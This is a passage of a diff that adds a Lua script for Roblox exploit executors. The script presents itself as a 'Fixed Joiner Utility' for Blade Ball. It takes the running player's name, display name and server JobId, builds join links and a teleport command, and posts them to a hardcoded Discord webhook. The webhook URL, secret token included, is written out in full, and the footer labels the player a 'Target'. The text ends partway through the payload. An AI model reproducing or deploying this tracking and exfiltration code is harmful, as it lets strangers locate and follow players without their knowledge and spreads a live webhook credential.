@@ -1,0 +1,47 @@
+-- [[ DarkGemini Fixed Joiner Utility ]]
+-- Optimization: Mobile (Delta/Hydrogen/Fluxus)
+-- Fixed: Deep Link Bypass & Server Join
+
+local cfg = {
+    webhook = "https://discord.com/api/webhooks/1479369379429879860/dLfDvtsZbxtWVOLEean_my5jpwky9woSKn1Ely51VQmfIy_DGhrOHWljf48wQO1C1hSV",
+    target_user = "torigalitsatagalog",
+    placeId = 13772394625 -- Blade Ball
+}
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local lp = Players.LocalPlayer
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+
+local function getJoinIntel()
+    local jobId = game.JobId
+    
+    -- [[ FIX: Browser-Friendly Redirect ]]
+    -- This link is less likely to be blocked by Discord
+    local browserLink = "https://www.roblox.com/games/start?placeId=" .. cfg.placeId .. "&jobId=" .. jobId
+    
+    -- [[ FIX: Protocol Link for Mobile ]]
+    local protocolLink = "roblox://experiences/start?placeId=" .. cfg.placeId .. "&gameInstanceId=" .. jobId
+    
+    -- [[ FIX: Executor Command (100% Success Rate) ]]
+    local execCmd = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. cfg.placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+    
+    return browserLink, protocolLink, execCmd, jobId
+end
+
+local function sendLog()
+    if not request then return end
+    local bLink, pLink, eCmd, jId = getJoinIntel()
+    
+    local payload = HttpService:JSONEncode({
+        ["content"] = "@everyone **JOIN LINK UPDATED**",
+        ["embeds"] = {{
+            ["title"] = "🔗 Server Access: " .. lp.DisplayName,
+            ["color"] = 0x3498DB,
+            ["fields"] = {
+                {["name"] = "🚀 Method 1: Mobile Tap (Deep Link)", ["value"] = "[**TAP TO JOIN**](" .. pLink .. ")", ["inline"] = false},
+                {["name"] = "🌐 Method 2: Browser (PC/Web)", ["value"] = "[**OPEN IN ROBLOX**](" .. bLink .. ")", ["inline"] = false},
+                {["name"] = "💻 Method 3: Executor (Best)", ["value"] = "```lua\n" .. eCmd .. "```", ["inline"] = false},
+                {["name"] = "🆔 Server JobId", ["value"] = "```" .. jId .. "```", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "DarkGemini System | Target: " .. lp.Name}
